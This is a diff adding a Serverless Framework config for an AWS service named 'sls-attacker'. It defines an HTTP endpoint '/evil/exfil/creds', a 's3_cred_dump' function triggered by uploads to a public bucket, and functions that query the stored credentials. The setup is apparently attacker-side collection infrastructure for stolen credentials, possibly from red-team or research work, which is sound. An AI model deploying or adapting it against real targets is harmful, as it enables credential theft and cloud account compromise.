@@ -1,0 +1,73 @@
+service: sls-attacker
+
+plugins:
+  - serverless-iam-roles-per-function
+
+custom:
+  db_arn: ${ssm:/attacker/dynamo_table/arn}
+  db_name: ${ssm:/attacker/dynamo_table/name}
+
+provider:
+  name: aws
+  runtime: python3.8
+  memorySize: 256
+  stage: dev
+  region: ap-southeast-1
+  profile: ServerlessAttacker
+  environment:
+    DYNAMO_TABLE: ${self:custom.db_name}
+
+functions:
+  exfil_api:
+    handler: handler.exfil_api
+    events:
+    - httpApi:
+        method: POST
+        path: /evil/exfil/creds
+    iamRoleStatements:
+    - Effect: "Allow"        
+      Action:
+      - dynamodb:PutItem      
+      Resource: ${self:custom.db_arn}
+  
+  s3_attack:
+    handler: s3_cred_dump.main
+    events:
+      - s3:
+          bucket: ${ssm:/attacker/public_bucket/name}
+          event: s3:ObjectCreated:*
+          existing: true
+    iamRoleStatements:
+    - Effect: "Allow"        
+      Action:
+      - dynamodb:PutItem      
+      Resource: ${self:custom.db_arn}
+    - Effect: "Allow"
+      Action:
+      - s3:GetObject
+      Resource: ${ssm:/attacker/public_bucket/arn}/*
+  
+  use_creds:
+    handler: use_creds.main
+    iamRoleStatements:
+    - Effect: "Allow"        
+      Action:
+      - dynamodb:Query      
+      Resource: ${self:custom.db_arn}
+
+  use_creds_db:
+    handler: use_creds_db.main
+    iamRoleStatements:
+    - Effect: "Allow"        
+      Action:
+      - dynamodb:Query      
+      Resource: ${self:custom.db_arn}
+
+package:
+  exclude:
+    - node_modules/**
+    - .serverless/**
+    - package.json
+    - package-lock.json
+
+
